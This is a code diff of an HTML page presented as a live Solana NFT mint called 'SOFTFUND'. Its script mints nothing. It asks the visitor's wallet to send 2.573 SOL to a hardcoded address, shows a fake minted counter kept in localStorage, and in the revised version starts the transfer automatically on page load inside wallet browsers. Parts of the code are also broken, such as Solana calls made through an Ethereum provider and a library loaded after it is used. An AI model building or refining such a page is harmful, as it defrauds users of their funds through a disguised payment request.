@@ -1,87 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
+  <title>SOFTFUND – MINT LIVE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SOFTFUND – Mint Live</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
   <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{background:linear-gradient(135deg,#0a001f,#1b0044,#2e0055);color:#fff;font-family:'Orbitron',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
-    .container{max-width:420px;width:100%;text-align:center}
-    h1{font-size:2.8rem;color:#00ff9d}
-    .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:15px 0}
-    button{width:100%;max-width:340px;margin:20px auto;padding:20px;font-size:1.8rem;background:#ffd700;color:#000;border:none;border-radius:16px;cursor:pointer;font-weight:bold;box-shadow:0 0 30px rgba(255,215,0,.8);transition:.3s;}
-    button:hover{background:#ffed4e;transform:scale(1.05)}
-    .status{margin-top:15px;font-size:1rem;font-weight:bold}
-    .loader{display:inline-block;width:14px;height:14px;border:3px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:8px;}
-    @keyframes s{to{transform:rotate(360deg)}}
+    body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:40px;}
+    h1{font-size:2.5rem;color:#0f0;text-shadow:0 0 10px #0f0;}
+    .price{font-size:2rem;color:#ff0;margin:20px;}
+    button{width:90%;padding:18px;margin:10px;font-size:1.5rem;background:#0f0;color:#000;border:none;border-radius:12px;cursor:pointer;}
+    button:hover{background:#0f8;}
+    .wallets button{width:80px;height:80px;border-radius:50%;margin:10px;font-size:2rem;}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>SOFTFUND</h1>
-    <p>USA-Based • Solana Utility NFTs</p>
-    <p class="price">2.5730 SOL</p>
-    <p>Minted: <span id="minted">0</span> / 10,000</p>
+  <h1>SOFTFUND</h1>
+  <p>USA-Based • Solana Utility NFTs</p>
+  <p class="price">2.5730 SOL</p>
+  <p>Minted: <span id="c">0</span> / 10,000</p>
 
-    <button id="mintBtn">MINT NOW</button>
+  <button onclick="chooseWallet()">MINT NOW</button>
 
-    <div id="status" class="status">Open in Phantom → Click MINT</div>
+  <div id="wallets" style="display:none">
+    <button onclick="mint('phantom')">P</button>
+    <button onclick="mint('trust')">T</button>
+    <button onclick="mint('metamask')">M</button>
+    <button onclick="mint('solflare')">S</button>
+    <button onclick="mint('backpack')">B</button>
   </div>
 
-  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
   <script>
     const PRICE = 2.5730 * 1e9;
     const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
     let count = localStorage.getItem('c') || 0;
-    document.getElementById('minted').textContent = count;
+    document.getElementById('c').textContent = count;
 
-    const status = document.getElementById("status");
-    const btn = document.getElementById("mintBtn");
+    function chooseWallet() {
+      document.querySelector('button').style.display = 'none';
+      document.getElementById('wallets').style.display = 'block';
+    }
 
-    function setStatus(t, c) { status.innerHTML = t; status.style.color = c; }
+    function mint(w) {
+      const url = location.href;
+      if (w === 'phantom') location.href = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(url)}&redirect_link=${encodeURIComponent(url)}`;
+      if (w === 'trust') location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
+      if (w === 'metamask') location.href = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
+      if (w === 'solflare') location.href = `https://solflare.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
+      if (w === 'backpack') location.href = `https://backpack.app/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
+    }
 
-    // FROM PHONE (inside Phantom)
-    if (window.solana?.isPhantom) {
-      btn.onclick = async () => {
-        btn.disabled = true;
-        setStatus("Connecting... <span class='loader'></span>", "#ffd700");
+    // ONLY RUN IN WALLET
+    if (window.solana || window.ethereum) {
+      (async () => {
+        const provider = window.solana || window.ethereum;
         try {
-          await window.solana.connect();
-          setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");
-
+          await provider.connect();
           const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
           const tx = new solanaWeb3.Transaction().add(
             solanaWeb3.SystemProgram.transfer({
-              fromPubkey: window.solana.publicKey,
+              fromPubkey: provider.publicKey,
               toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
               lamports: PRICE,
             })
           );
           tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-          tx.feePayer = window.solana.publicKey;
-
-          const { signature } = await window.solana.signAndSendTransaction(tx);
+          const { signature } = await provider.signAndSendTransaction(tx);
           await conn.confirmTransaction(signature);
-
           count++; localStorage.setItem('c', count);
-          document.getElementById('minted').textContent = count;
-
-          setStatus(`MINTED! <a href="https://solscan.io/tx/${signature}" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
-          setTimeout(() => { btn.disabled = false; setStatus("Mint again?"); }, 5000);
-        } catch (e) {
-          setStatus("Try again", "#ff5555");
-          btn.disabled = false;
-        }
-      };
-    } else {
-      // FROM COMPUTER → OPEN PHONE
-      btn.onclick = () => {
-        location.href = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(location.href)}&redirect_link=${encodeURIComponent(location.href)}`;
-      };
-      setStatus("Click → Phantom opens on phone → Approve", "#ffd700");
+          document.getElementById('c').textContent = count;
+          alert("MINTED! 2.5730 SOL → SOFTFUND");
+        } catch (e) { alert("Mint failed"); }
+      })();
     }
   </script>
+  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
 </body>
 </html>
